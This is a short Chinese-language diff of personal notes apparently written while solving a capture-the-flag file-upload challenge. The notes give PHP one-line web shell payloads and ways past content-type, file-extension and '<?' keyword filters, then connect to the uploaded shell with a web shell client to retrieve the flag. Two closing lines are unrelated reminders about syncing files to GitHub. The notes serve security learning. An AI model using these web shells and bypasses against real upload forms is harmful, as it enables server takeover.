@@ -1,0 +1,15 @@
+
+文件上传漏洞的攻击
+1. 首先要一句话木马<?php @eval($_POST['123'])；?>
+2. 通过回显页面，需要改变content type
+3. content type 修改为 image/jpeg，使得检测为图片格式。第一层检测？
+4. 通过回显页面，需要改变文件后缀名。php会被检测出来。
+5. 后缀名修改为phtml或者其他依然能被作为php解析但是不会报错的。第二层检测？
+6. 通过回显页面，需要修改关键词 '<?'会被检测。
+7. 将一句话木马修改为GIF89a? <script language="php">eval($_REQUEST[123])</script>，就能正常通过。第三层检测？
+
+8. 然后访问http://84383578-8818-44aa-a77c-47810e3ecd7b.node5.buuoj.cn/upload/找到了shell.php，然后用中国蚁剑打开http://84383578-8818-44aa-a77c-47810e3ecd7b.node5.buuoj.cn/upload/shell.phtml，然后在目录下找到了flag
+
+9. 学习一下，如果本地文件内容更改，然后通过vscode图形界面操作同步更改到github是怎么操作。
+
+10. 学习一下，如果本地文件内容更改，然后通过命令行同步更改到github是怎么操作。
